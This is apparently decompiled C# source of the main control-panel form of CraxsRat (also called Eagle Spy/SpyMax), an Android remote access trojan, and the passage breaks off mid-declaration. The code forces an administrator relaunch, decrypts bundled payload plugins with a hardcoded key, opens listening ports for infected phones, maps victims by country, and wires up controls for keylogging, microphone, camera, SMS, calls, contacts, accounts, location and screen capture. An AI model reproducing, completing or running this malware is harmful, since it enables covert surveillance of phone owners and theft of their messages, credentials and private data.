using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Media;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Windows.Media;
using Eagle_Spy.My;
using Eagle_Spy.My.Resources;
using Eagle_Spy.sockets;
using DrakeUI.Framework;
using Eaglespy;
using LiveCharts.Maps;
using LiveCharts.WinForms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Guna.UI2.WinForms;

namespace Eagle_Spy;

[DesignerGenerated]
public class CraxsMain : Form
{
	public delegate void addLogback(object[] objs);

	public delegate void deleNotifidgv(object[] objs);

	public delegate void delecallsidgv(object[] objs);

	public delegate void delealertsidgv(object[] objs);

	public delegate void deleaddnewrow(object[] obj);

	public delegate void updateuiD(object[] objs);
    private PerformanceCounter cpuCounter;

    [CompilerGenerated]
	private sealed class VB_0024StateMachine_108_smoothfadedout : IAsyncStateMachine
	{
		public int _0024State;

		public AsyncVoidMethodBuilder _0024Builder;

		internal Form _0024VB_0024Local_targetform;

		internal int _0024VB_0024Local_slowtime;

		internal CraxsMain _0024VB_0024Me;

		internal Form _0024S0;

		internal TaskAwaiter _0024A0;

		[CompilerGenerated]
		internal void MoveNext()
		{
			int num = _0024State;
			try
			{
				if (num != 0)
					goto IL_0028;
				num = -1;
				_0024State = -1;
				TaskAwaiter awaiter = _0024A0;
				_0024A0 = default(TaskAwaiter);
				goto IL_005a;
			IL_0028:
				if (_0024VB_0024Local_targetform.Opacity > 0.0)
				{
					awaiter = Task.Delay(_0024VB_0024Local_slowtime).GetAwaiter();
					if (!awaiter.IsCompleted)
					{
						num = 0;
						_0024State = 0;
						_0024A0 = awaiter;
						ref AsyncVoidMethodBuilder reference = ref _0024Builder;
						VB_0024StateMachine_108_smoothfadedout stateMachine = this;
						reference.AwaitUnsafeOnCompleted(ref awaiter, ref stateMachine);
						return;
					}
					goto IL_005a;
				}
				_0024VB_0024Local_targetform.Opacity = 0.0;
				_0024VB_0024Me.Close();
				goto end_IL_0007;
			IL_005a:
				awaiter.GetResult();
				awaiter = default(TaskAwaiter);
				(_0024S0 = _0024VB_0024Local_targetform).Opacity = _0024S0.Opacity - 0.05;
				goto IL_0028;
			end_IL_0007:;
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception exception = ex;
				_0024State = -2;
				_0024Builder.SetException(exception);
                //////CraxsAlert.Showinformation("Sorry");
                return;
			}
			num = -2;
			_0024State = -2;
			_0024Builder.SetResult();
		}

		void IAsyncStateMachine.MoveNext()
		{
			//ILSpy generated this explicit interface implementation from .override directive in MoveNext
			this.MoveNext();
		}

		[DebuggerNonUserCode]
		void IAsyncStateMachine.SetStateMachine(IAsyncStateMachine stateMachine)
		{
		}
	}

	[CompilerGenerated]
	private sealed class VB_0024StateMachine_28_EagleSpyMain_Load : IAsyncStateMachine
	{
		public int _0024State;

		public AsyncVoidMethodBuilder _0024Builder;

		internal object _0024VB_0024Local_sender;

		internal EventArgs _0024VB_0024Local_e;

		internal CraxsMain _0024VB_0024Me;

		internal WindowsIdentity _0024VB_0024ResumableLocal_identity_00240;

		internal WindowsPrincipal _0024VB_0024ResumableLocal_principal_00241;

		internal bool _0024VB_0024ResumableLocal_isElevated_00242;

		internal DialogResult _0024S3;

		internal Padding _0024VB_0024ResumableLocal_padding_00244;

		internal DirectoryInfo _0024VB_0024ResumableLocal_FileDirectory_00245;

		internal FileInfo[] _0024VB_0024ResumableLocal_plug_00246;

		internal string[] _0024VB_0024ResumableLocal_plugExi_00247;

		internal bool _0024VB_0024ResumableLocal_missing_00248;

		internal string[] _0024S9;

		internal int _0024S10;

		internal string _0024VB_0024ResumableLocal_n_002411;

		internal string _0024VB_0024ResumableLocal_pathTest_002412;

		internal FileInfo[] _0024S13;

		internal int _0024S14;

		internal FileInfo _0024VB_0024ResumableLocal_File_002415;

		internal byte[] _0024VB_0024ResumableLocal_by2_002416;

		internal Array _0024VB_0024ResumableLocal_PU2_002417;

		internal byte[] _0024VB_0024ResumableLocal_BY_002418;

		internal Array _0024VB_0024ResumableLocal_PU_002419;

		internal string _0024VB_0024ResumableLocal_WinMM_002420;

		internal FontStyle _0024VB_0024ResumableLocal_F0ntStyle_002421;

		internal string _0024VB_0024ResumableLocal_ttFont_002422;

		internal string _0024S23;

		internal int _0024VB_0024ResumableLocal_F0ntSize_002424;

		internal string _0024VB_0024ResumableLocal_filepath_002425;

		internal string[] _0024VB_0024ResumableLocal_list_002426;

		internal string[] _0024S27;

		internal int _0024S28;

		internal string _0024VB_0024ResumableLocal_lin_002429;

		internal string[] _0024S30;

		internal int _0024S31;

		internal string _0024VB_0024ResumableLocal_p_002432;

		internal int _0024VB_0024ResumableLocal_index_002433;

		internal Exception _0024VB_0024ResumableLocal_ex_002434;

		internal string _0024S35;

		internal IEnumerator _0024S36;

		internal DataGridViewColumn _0024VB_0024ResumableLocal_column_002437;

		internal IEnumerator _0024S38;

		internal DataGridViewColumn _0024VB_0024ResumableLocal_column_002439;

		internal ProcessStartInfo _0024VB_0024ResumableLocal_startInfo_002440;

		internal Process _0024VB_0024ResumableLocal_myprocess_002441;

		internal Exception _0024VB_0024ResumableLocal_ex_002442;

		internal Exception _0024VB_0024ResumableLocal_ex_002443;

		[MethodImpl(MethodImplOptions.NoOptimization)]
		[CompilerGenerated]
		internal void MoveNext()
		{
			int num = _0024State;
			checked
			{
				try
				{
					try
					{
						_0024VB_0024ResumableLocal_identity_00240 = WindowsIdentity.GetCurrent();
						_0024VB_0024ResumableLocal_principal_00241 = new WindowsPrincipal(_0024VB_0024ResumableLocal_identity_00240);
						_0024VB_0024ResumableLocal_isElevated_00242 = _0024VB_0024ResumableLocal_principal_00241.IsInRole(WindowsBuiltInRole.Administrator);
						if (_0024VB_0024ResumableLocal_isElevated_00242)
						{
							if (!Directory.Exists(reso.Storepath))
								Directory.CreateDirectory(reso.Storepath);
							if (_0024VB_0024Me.ran == null)
								_0024VB_0024Me.ran = new Random();
							_0024VB_0024Me.Globalvlues = new Dictionary<string, double>();
							_0024VB_0024Me.GlobalMap.EnableZoomingAndPanning = true;
							_0024VB_0024Me.GlobalMap.HeatMap = _0024VB_0024Me.Globalvlues;
							_0024VB_0024Me.GlobalMap.Base.Background = new SolidColorBrush(Colors.Transparent);
							_0024VB_0024Me.GlobalMap.Source = $"{Application.StartupPath}\\\\World.xml";
							((Control)(object)_0024VB_0024Me.GlobalMap).BackColor = System.Drawing.Color.Black;
							((Control)(object)_0024VB_0024Me.GlobalMap).ForeColor = System.Drawing.Color.Black;
							((Control)(object)_0024VB_0024Me.GlobalMap).BackgroundImage = Resources.LOGO;
							((Control)(object)_0024VB_0024Me.GlobalMap).BackgroundImageLayout = ImageLayout.Zoom;
							((Control)(object)_0024VB_0024Me.GlobalMap).Visible = true;
							((Control)(object)_0024VB_0024Me.GlobalMap).Enabled = true;
							((Control)(object)_0024VB_0024Me.GlobalMap).Dock = DockStyle.Fill;
							_0024VB_0024Me.GlobalMap.LandClick += _0024VB_0024Me.Countryclickhandelr;
							_0024VB_0024Me.MapPannel.Controls.Add((Control)(object)_0024VB_0024Me.GlobalMap);
							_0024VB_0024Me.Icon = Resources.max;
							_0024VB_0024Me.Text = string.Format("");
							_0024VB_0024Me.PortsManager = new Ports();
							_0024S3 = _0024VB_0024Me.PortsManager.ShowDialog(_0024VB_0024Me);
							DialogResult dialogResult = _0024S3;
							if (dialogResult != DialogResult.OK)
								_0024VB_0024Me.FormEventArgsClosing();
							_0024VB_0024Me.ClientsWindow.GetType().InvokeMember("DoubleBuffered", BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.SetProperty, null, _0024VB_0024Me.ClientsWindow, new object[1] { true });
							_0024VB_0024Me.ClientsWindow.RowTemplate.DividerHeight = 3;
							_0024VB_0024ResumableLocal_padding_00244 = new Padding(3);
							_0024VB_0024Me.ClientsWindow.RowTemplate.DefaultCellStyle.Padding = _0024VB_0024ResumableLocal_padding_00244;
							_0024VB_0024Me.ClientsWindow.RectColor = System.Drawing.Color.FromArgb(157, 5, 17);
							_0024VB_0024Me.ClientsWindow.GridColor = System.Drawing.Color.FromArgb(0, 0, 0);
							_0024VB_0024ResumableLocal_FileDirectory_00245 = new DirectoryInfo(reso.res_Path + "\\Plugins\\Android");
							_0024VB_0024ResumableLocal_plug_00246 = _0024VB_0024ResumableLocal_FileDirectory_00245.GetFiles("*.pl");
							_0024VB_0024ResumableLocal_plugExi_00247 = "gen-1.pl,gen-2.pl,gen-3.pl,gen-4.pl,gen-5.pl,gen-6.pl,gen-7.pl,gen-8.pl".Split(new string[1] { "," }, StringSplitOptions.None);
							_0024VB_0024ResumableLocal_missing_00248 = false;
							_0024S9 = _0024VB_0024ResumableLocal_plugExi_00247;
							for (_0024S10 = 0; _0024S10 < _0024S9.Length; _0024S10++)
							{
								_0024VB_0024ResumableLocal_n_002411 = _0024S9[_0024S10];
								_0024VB_0024ResumableLocal_pathTest_002412 = $"{_0024VB_0024ResumableLocal_FileDirectory_00245.FullName}\\{_0024VB_0024ResumableLocal_n_002411}";
								if (!File.Exists(_0024VB_0024ResumableLocal_pathTest_002412))
								{
									_0024VB_0024ResumableLocal_missing_00248 = true;
									Interaction.MsgBox($"Missing :{_0024VB_0024ResumableLocal_pathTest_002412}", MsgBoxStyle.Critical, reso.nameRAT);
								}
							}
							if (_0024VB_0024ResumableLocal_missing_00248)
								_0024VB_0024Me.FormEventArgsClosing();
							reso.plug = new List<object>();
							_0024S13 = _0024VB_0024ResumableLocal_plug_00246;
							for (_0024S14 = 0; _0024S14 < _0024S13.Length; _0024S14++)
							{
								_0024VB_0024ResumableLocal_File_002415 = _0024S13[_0024S14];
								if ((Operators.CompareString(_0024VB_0024ResumableLocal_File_002415.Name, "gen-4.pl", TextCompare: false) == 0) | (Operators.CompareString(_0024VB_0024ResumableLocal_File_002415.Name, "gen-5.pl", TextCompare: false) == 0) | (Operators.CompareString(_0024VB_0024ResumableLocal_File_002415.Name, "gen-1.pl", TextCompare: false) == 0))
								{
									_0024VB_0024ResumableLocal_by2_002416 = File.ReadAllBytes(_0024VB_0024ResumableLocal_File_002415.FullName);
									_0024VB_0024ResumableLocal_PU2_002417 = new object[6]
									{
										reso.domen + "." + reso.Generals(_0024VB_0024ResumableLocal_File_002415.Name.Substring(0, _0024VB_0024ResumableLocal_File_002415.Name.LastIndexOf("."))),
										Conversions.ToString(_0024VB_0024ResumableLocal_plug_00246.Length),
										"rm -r ",
										"dex",
										_0024VB_0024ResumableLocal_by2_002416,
										"ping -c 1 -W 15 "
									};
									reso.plug.Add(_0024VB_0024ResumableLocal_PU2_002417);
								}
								else
								{
									_0024VB_0024ResumableLocal_BY_002418 = Codes.DE(File.ReadAllBytes(_0024VB_0024ResumableLocal_File_002415.FullName), "spymax");
									_0024VB_0024ResumableLocal_PU_002419 = new object[6]
									{
										reso.domen + "." + reso.Generals(_0024VB_0024ResumableLocal_File_002415.Name.Substring(0, _0024VB_0024ResumableLocal_File_002415.Name.LastIndexOf("."))),
										Conversions.ToString(_0024VB_0024ResumableLocal_plug_00246.Length),
										"rm -r ",
										"dex",
										_0024VB_0024ResumableLocal_BY_002418,
										"ping -c 1 -W 15 "
									};
									reso.plug.Add(_0024VB_0024ResumableLocal_PU_002419);
								}
							}
							if (Operators.CompareString(MySettingsProperty.Settings.hidecoonstart, "Yes", TextCompare: false) != 0)
							{
								_0024VB_0024Me.DataLog.Tag = "f";
								_0024VB_0024Me.DataLog.BringToFront();
								_0024VB_0024Me.DataLog.Visible = true;
								_0024VB_0024Me.clearbtn.Visible = true;
							}
							if (Operators.CompareString(MySettingsProperty.Settings._multi_sounds, "Yes", TextCompare: false) == 0)
								Notif_Sound.multi = true;
							else
								Notif_Sound.multi = false;
							_0024VB_0024Me.ClientsWindow.Tag = "f";
							if (File.Exists(Notif_Sound.getsoundpath()))
							{
								Notif_Sound.aMedia = new SoundPlayer();
								Notif_Sound.aMedia.SoundLocation = Notif_Sound.getsoundpath();
								Notif_Sound.aMedia.Load();
							}
							reso.maps = new StringBuilder();
							reso.maps.Append(File.ReadAllText(reso.res_Path + "\\Config\\maps.inf"));
							_0024VB_0024ResumableLocal_WinMM_002420 = reso.MY_Path + "WinMM.Net.dll";
							if (!File.Exists(_0024VB_0024ResumableLocal_WinMM_002420))
								Interaction.MsgBox("Can't Find File WinMM.Net.dll\r\n please Check Windows Defender and extract rat files again");
							else
							{
								_0024VB_0024ResumableLocal_F0ntStyle_002421 = FontStyle.Regular;
								_0024VB_0024ResumableLocal_ttFont_002422 = "Hack-Regular.ttf";
								_0024S23 = MySettingsProperty.Settings.FontStyle;
								string left = _0024S23;
								if (Operators.CompareString(left, "Bold", TextCompare: false) != 0)
								{
									if (Operators.CompareString(left, "Regular", TextCompare: false) == 0)
									{
										_0024VB_0024ResumableLocal_F0ntStyle_002421 = FontStyle.Regular;
										_0024VB_0024ResumableLocal_ttFont_002422 = "Hack-Regular.ttf";
									}
								}
								else
								{
									_0024VB_0024ResumableLocal_F0ntStyle_002421 = FontStyle.Bold;
									_0024VB_0024ResumableLocal_ttFont_002422 = "Hack-Bold.ttf";
								}
								_0024VB_0024ResumableLocal_F0ntSize_002424 = MySettingsProperty.Settings.FontSize;
								reso.f = CustomFont.LoadFont(_0024VB_0024ResumableLocal_ttFont_002422, _0024VB_0024ResumableLocal_F0ntSize_002424, _0024VB_0024ResumableLocal_F0ntStyle_002421);
								reso.FontDrawString = CustomFontDrawString.LoadFont(_0024VB_0024ResumableLocal_ttFont_002422, 11, _0024VB_0024ResumableLocal_F0ntStyle_002421);
								reso.SupportedText = File.ReadAllText(reso.res_Path + "\\Config\\supported_text.inf").ToLower();
								reso.SupportedImages = File.ReadAllText(reso.res_Path + "\\Config\\supported_images.inf").ToLower();
								_0024VB_0024Me.label16.Text = "CraxsRat.net";
								_0024VB_0024Me.checksavepass.Checked = MySettingsProperty.Settings.savepass;
								if (_0024VB_0024Me.checksavepass.Checked)
								{
									_0024VB_0024ResumableLocal_filepath_002425 = Environment.CurrentDirectory.ToString() + "\\res\\Config\\Pass.inf";
									_0024VB_0024ResumableLocal_list_002426 = File.ReadAllLines(_0024VB_0024ResumableLocal_filepath_002425);
									_0024S27 = _0024VB_0024ResumableLocal_list_002426;
									for (_0024S28 = 0; _0024S28 < _0024S27.Length; _0024S28++)
									{
										_0024VB_0024ResumableLocal_lin_002429 = _0024S27[_0024S28];
										_0024VB_0024Me.passtxt.Text = Codes.AES_Decrypt(_0024VB_0024ResumableLocal_lin_002429, Data.THEKEY);
									}
								}
								_0024S30 = MySettingsProperty.Settings.ports.Split('>');
								for (_0024S31 = 0; _0024S31 < _0024S30.Length; _0024S31++)
								{
									_0024VB_0024ResumableLocal_p_002432 = _0024S30[_0024S31];
									try
									{
										if ((_0024VB_0024ResumableLocal_p_002432 != null) & !string.IsNullOrEmpty(_0024VB_0024ResumableLocal_p_002432))
										{
											_0024VB_0024ResumableLocal_index_002433 = _0024VB_0024Me.DGVSERVS.Rows.Add(Resources.swtchoff, _0024VB_0024ResumableLocal_p_002432, "OFF");
											_0024VB_0024Me.DGVSERVS.Rows[_0024VB_0024ResumableLocal_index_002433].Cells[2].Style.ForeColor = System.Drawing.Color.Red;
											_0024VB_0024Me.DGVSERVS.Rows[_0024VB_0024ResumableLocal_index_002433].Cells[0].Tag = "OFF";
											_0024VB_0024Me.DGVSERVS.Rows[_0024VB_0024ResumableLocal_index_002433].Tag = _0024VB_0024ResumableLocal_p_002432;
										}
									}
									catch (Exception ex)
									{
										ProjectData.SetProjectError(ex);
										Exception ex2 = ex;
										_0024VB_0024ResumableLocal_ex_002434 = ex2;
                                        //////CraxsAlert.Showinformation("Sorry");
                                    }
                                }
								reso.SupportedVideo = File.ReadAllText(reso.res_Path + "\\Config\\supported_video.inf").ToLower();
								RegistryHandler.SetUserHandleLimit();
								if (Operators.CompareString(MySettingsProperty.Settings.checkupdatestart, "Yes", TextCompare: false) == 0)
									_0024VB_0024Me.checkupdate.Start();
								_0024S35 = RegistryHandler.Get_Language();
								string left2 = _0024S35;
								if (Operators.CompareString(left2, "CN", TextCompare: false) != 0)
								{
									if (Operators.CompareString(left2, "AR", TextCompare: false) == 0)
										try
										{
											_0024S38 = _0024VB_0024Me.ClientsWindow.Columns.GetEnumerator();
											while (_0024S38.MoveNext())
											{
												_0024VB_0024ResumableLocal_column_002439 = (DataGridViewColumn)_0024S38.Current;
												_0024VB_0024ResumableLocal_column_002439.HeaderText = Codes.Translate(_0024VB_0024ResumableLocal_column_002439.HeaderText, "en", "ar");
											}
										}
										finally
										{
											if (num < 0 && _0024S38 is IDisposable)
												(_0024S38 as IDisposable).Dispose();
										}
								}
								else
									try
									{
										_0024S36 = _0024VB_0024Me.ClientsWindow.Columns.GetEnumerator();
										while (_0024S36.MoveNext())
										{
											_0024VB_0024ResumableLocal_column_002437 = (DataGridViewColumn)_0024S36.Current;
											_0024VB_0024ResumableLocal_column_002437.HeaderText = Codes.Translate(_0024VB_0024ResumableLocal_column_002437.HeaderText, "en", "zh");
										}
									}
									finally
									{
										if (num < 0 && _0024S36 is IDisposable)
											(_0024S36 as IDisposable).Dispose();
									}
								_0024VB_0024Me.TOpacity.Interval = SpySettings.T_Interval;
								_0024VB_0024Me.TOpacity.Enabled = true;
								_0024VB_0024Me.PortsManager.StartPosition = FormStartPosition.CenterScreen;
								_0024VB_0024Me.NotifyI();
								reso.NewIcon(reso.res_Path + "\\Icons\\apk.ico", ".apk");
								_0024VB_0024Me.monitortimer.Start();
								_0024VB_0024Me.mapworker.RunWorkerAsync();
								_0024VB_0024Me.Statustimer.Start();
								_0024VB_0024Me.Opacity = 1.0;
								CraxsAlert.ShowSucess("Welcome to CraxsRat");
							}
						}
						else
						{
							_0024VB_0024ResumableLocal_startInfo_002440 = new ProcessStartInfo();
							_0024VB_0024ResumableLocal_myprocess_002441 = new Process();
							_0024VB_0024ResumableLocal_startInfo_002440.FileName = Application.ExecutablePath;
							_0024VB_0024ResumableLocal_startInfo_002440.Verb = "runas";
							_0024VB_0024ResumableLocal_myprocess_002441.StartInfo = _0024VB_0024ResumableLocal_startInfo_002440;
							try
							{
								_0024VB_0024ResumableLocal_myprocess_002441.Start();
							}
							catch (Exception ex3)
							{
								ProjectData.SetProjectError(ex3);
								Exception ex4 = ex3;
								_0024VB_0024ResumableLocal_ex_002442 = ex4;
                                //////CraxsAlert.Showinformation("Sorry");
                            }
                            finally
							{
								if (num < 0)
									ProjectData.EndApp();
							}
						}
					}
					catch (Exception ex5)
					{
						ProjectData.SetProjectError(ex5);
						Exception ex6 = ex5;
						_0024VB_0024ResumableLocal_ex_002443 = ex6;
						throw new Exception("Global Error:" + _0024VB_0024ResumableLocal_ex_002443.Message);
					}
				}
				catch (Exception ex7)
				{
					ProjectData.SetProjectError(ex7);
					Exception exception = ex7;
					_0024State = -2;
					_0024Builder.SetException(exception);
                    //////CraxsAlert.Showinformation("Sorry");
                    return;
				}
				num = -2;
				_0024State = -2;
				_0024Builder.SetResult();
			}
		}

		void IAsyncStateMachine.MoveNext()
		{
			//ILSpy generated this explicit interface implementation from .override directive in MoveNext
			this.MoveNext();
		}

		[DebuggerNonUserCode]
		void IAsyncStateMachine.SetStateMachine(IAsyncStateMachine stateMachine)
		{
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__171_002D0
	{
		public Dictionary<string, double> _0024VB_0024Local_keyValues;

		public _Closure_0024__171_002D0(_Closure_0024__171_002D0 arg0)
		{
			if (arg0 != null)
				_0024VB_0024Local_keyValues = arg0._0024VB_0024Local_keyValues;
		}

		[SpecialName]
		internal void _Lambda_0024__0()
		{
			Data.MainForm.GlobalMap.HeatMap = _0024VB_0024Local_keyValues;
			((Control)(object)Data.MainForm.GlobalMap).Update();
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__210_002D0
	{
		public string _0024VB_0024Local_portnumber;

		public CraxsMain _0024VB_0024Me;

		public _Closure_0024__210_002D0(_Closure_0024__210_002D0 arg0)
		{
			if (arg0 != null)
				_0024VB_0024Local_portnumber = arg0._0024VB_0024Local_portnumber;
		}

		[SpecialName]
		internal void _Lambda_0024__0()
		{
			_0024VB_0024Me.server.Add(new Accept(_0024VB_0024Local_portnumber));
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__56_002D0
	{
		public DataGridViewRow _0024VB_0024Local_row;

		public string _0024VB_0024Local_uuid;

		public CraxsMain _0024VB_0024Me;

		public _Closure_0024__56_002D0(_Closure_0024__56_002D0 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_row = arg0._0024VB_0024Local_row;
				_0024VB_0024Local_uuid = arg0._0024VB_0024Local_uuid;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__0()
		{
			_0024VB_0024Me.RemoveCard(_0024VB_0024Local_row, _0024VB_0024Local_uuid);
		}
	}

	public string PORTs;

	public List<Accept> server;

	private string Myname;

	public bool Alive;

	public static bool ISDB = true;

	public static int MyStatus = 1;

	private int Mx;

	private int Min;

	private int Sw;

	private int Sh;

	private bool mov;

	public string DKF;

	public string DKD;

	public Ports PortsManager;

	public GeoMap GlobalMap;

	public Dictionary<string, double> Globalvlues;

	public System.Threading.Timer _timer;

	//private About A;

	//public Build B;

	//public Store store;

	public BackgroundWorker[] Workers;

	private object NumWorkers;

	public clsComputerInfo SCANER;

	public Win_Users WU;

	//private Settinngs CYPHERSETTNGS;

	private string temptext;

	private string temptext2;

	//public Jector JC;

	public bool isactive;

	private List<DataGridViewRow> searchbefore;

	public Random ran;

	//public Apk_studio ST;

	public Drooper DR;

	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("notfi")]
	private NotifyIcon _notfi;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("TOpacity")]
	private System.Windows.Forms.Timer _TOpacity;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("TopPanel")]
	private Panel _TopPanel;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("clearbtn")]
	private DrakeUIAvatar _clearbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("PictureBox1")]
	private PictureBox _PictureBox1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Panel3")]
	private Panel _Panel3;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("infolowtext")]
	private Label _infolowtext;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Home_Btn")]
	private DrakeUIButtonIcon _Home_Btn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Build_btn")]
	private DrakeUIButtonIcon _Build_btn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("inject_btn")]
	private DrakeUIButtonIcon _inject_btn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Settings_btn")]
	private DrakeUIButtonIcon _Settings_btn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("searchbtn")]
	private DrakeUIAvatar _searchbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("searchtext")]
	private DrakeUITextBox _searchtext;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("uncheckbtn")]
	private DrakeUIButtonIcon _uncheckbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon8")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon8;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("HBlockbtn")]
	private DrakeUIButtonIcon _HBlockbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Hinfobtn")]
	private DrakeUIButtonIcon _Hinfobtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("clientfoldrbtn")]
	private DrakeUIButtonIcon _clientfoldrbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon9")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon9;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon13")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon13;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon12")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon12;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("BlockClientToolStripMenuItem")]
	private ToolStripMenuItem _BlockClientToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem1")]
	private ToolStripMenuItem _ToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("clearsrchbtn")]
	private DrakeUIAvatar _clearsrchbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("supportbtn")]
	private DrakeUIButtonIcon _supportbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("locationbtn")]
	private DrakeUIButtonIcon _locationbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("keyloggerbtn")]
	private DrakeUIButtonIcon _keyloggerbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("callsbtn")]
	private DrakeUIButtonIcon _callsbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("micbtn")]
	private DrakeUIButtonIcon _micbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("accountbtn")]
	private DrakeUIButtonIcon _accountbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("camerabtn")]
	private DrakeUIButtonIcon _camerabtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("applicationsbtn")]
	private DrakeUIButtonIcon _applicationsbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("screenbtn")]
	private DrakeUIButtonIcon _screenbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("contactbtn")]
	private DrakeUIButtonIcon _contactbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("screenreadbtn")]
	private DrakeUIButtonIcon _screenreadbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("filebtn")]
	private DrakeUIButtonIcon _filebtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("smsbtn")]
	private DrakeUIButtonIcon _smsbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon2")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon2;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("FilesToolStripMenuItem")]
	private ToolStripMenuItem _FilesToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("SMSToolStripMenuItem")]
	private ToolStripMenuItem _SMSToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("CallsToolStripMenuItem1")]
	private ToolStripMenuItem _CallsToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ContactsToolStripMenuItem")]
	private ToolStripMenuItem _ContactsToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("AccountsToolStripMenuItem")]
	private ToolStripMenuItem _AccountsToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ApplicationsToolStripMenuItem")]
	private ToolStripMenuItem _ApplicationsToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
